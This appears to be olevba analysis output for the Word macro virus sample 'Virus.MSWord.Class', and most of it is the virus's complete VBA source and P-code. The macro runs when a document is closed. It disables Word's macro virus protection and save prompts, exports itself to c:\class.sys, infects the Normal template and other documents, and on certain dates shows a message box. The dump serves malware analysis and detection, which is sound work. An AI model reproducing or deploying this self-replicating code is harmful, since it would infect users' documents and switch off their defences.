olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ct
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ct - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
On Error GoTo out
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
Options.VirusProtection = False
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
Options.SaveNormalPrompt = False
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
Options.ConfirmConversions = False
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
If nt > 70 And ad > 0 Then GoTo out
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
If nt < 70 Then
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
End If
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "Hey there, Carol! ", 0, "Class.Poppy"
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
With host.codemodule
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    For x = 1 To 4
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    .deletelines 1
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    Next x
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
End With
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
If nt < 70 Then
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    With host.codemodule
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    .replaceline 1, "Sub AutoClose()"
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    .replaceline 91, "Sub ToolsMacro()"
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    For x = 70 To 81
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
        .deletelines 62
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    Next x
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    .replaceline 35, "    For x = 1 To 4"
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    End With
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
End If
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
With host.codemodule
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    For x = 2 To 104 Step 2
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    Next x
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
End With
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
out:
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
End Sub
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
Sub ToolsMacro()
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.ct
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6860 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #2:
' 	OnError out 
' Line #3:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #11:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #13:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #14:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #15:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #16:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #17:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #19:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #20:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #21:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #22:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #28:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "Hey there, Carol! "
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #29:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #30:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #31:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #32:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #33:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #34:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #35:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #37:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #40:
' 	EndWith 
' Line #41:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #42:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #43:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #44:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #45:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #46:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #48:
' 	LitDI2 0x005B 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #49:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #50:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0046 
' 	LitDI2 0x0051 
' 	For 
' Line #51:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #52:
' 	LitDI2 0x003E 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #53:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #54:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #56:
' 	LitDI2 0x0023 
' 	LitStr 0x0012 "    For x = 1 To 4"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #57:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #58:
' 	EndWith 
' Line #59:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #62:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #63:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #64:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0068 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #65:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #66:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #68:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #70:
' 	EndWith 
' Line #71:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #72:
' 	Label out 
' Line #73:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #74:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #75:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #76:
' 	EndSub 
' Line #77:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #78:
' 	FuncDefn (Sub ToolsMacro())
' Line #79:
' 	QuoteRem 0x0000 0x003B "Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc"
' Line #80:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

